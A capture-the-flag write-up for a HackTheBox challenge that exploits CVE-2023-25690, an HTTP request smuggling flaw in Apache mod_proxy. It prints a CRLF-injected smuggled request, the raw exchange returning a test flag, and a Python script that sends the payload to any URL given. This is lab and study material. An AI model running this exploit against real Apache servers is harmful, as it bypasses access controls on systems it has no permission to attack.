#  ApacheBlaze HTB Challenge 

Looking at the configuration files we can see that "**httpd.conf**" has a rewrite rule:

```sh
RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
```
From the Dockerfile we can get the Apache version 2.4.5 that confirm the vulnerabilities.

## CVE-2023-25690

### References
- https://httpd.apache.org/security/vulnerabilities_24.html
- https://github.com/dhmosfunk/CVE-2023-25690-POC

The server is vulnerable to **HTTP SMUGGLING ATTACK** because of the mod_proxy configuration.
The github link has a very good POC that work just perfect!

We need to reach /api/games/click_topia in order to get the Flag but we can only reach that endpoint from **dev.apacheblaze.local"**.

If we take a look at the code we can see that it's asking for the header "X-Forwarded-Host".
```python
    elif game == 'click_topia':
        if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
            return jsonify({
                'message': f'{app.config["FLAG"]}'
            }), 200
        else:
            return jsonify({
                'message': 'This game is currently available only from dev.apacheblaze.local.'
            }), 200
```

Now, this got me to lose time because i was trying the Smuggling Attack with the header and it did not work. But if we make the request with the Host: dev.apacheblaze.local it works!

## Exploit

We need to craft our request.

This is the final Smuggled HTTP request
```
api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1
```

The server Split the request into:
```
api/games/click_topia HTTP/1.1
Host: dev.apacheblaze.local

GET /SMUGGLED HTTP/1.1
```
#### Request
```http
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1
Host: 127.0.0.1:1337
...
```
#### Response
```http
HTTP/1.1 200 OK
Date: Sat, 04 Nov 2023 11:50:01 GMT
Server: Apache
Content-Type: application/json
Content-Length: 41

{"message":"HTB{f4k3_fl4g_f0r_t3st1ng}"}
```

#### Python script
```python
import requests
import sys

if len(sys.argv) != 2:
    print("Usage: python3 script.py <URL>")
    sys.exit(1)

url = sys.argv[1]
if not url.startswith('http://') and not url.startswith('https://'):
    url = 'http://' + url
try:
    # Componi l'URL completo con la richiesta GET specificata.
    full_url = f'{url}/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1'

    # Invia la richiesta GET all'URL specificato.
    response = requests.get(full_url)

    if response.status_code == 200:
    	print(" ")
    	print("############ GOT THE FLAG ############")
    	print(" ")
    	print(response.text)
    else:
        print(f'NOPE: {response.status_code}')
except requests.exceptions.RequestException as e:
    print(f'Errore nella richiesta: {e}')

```
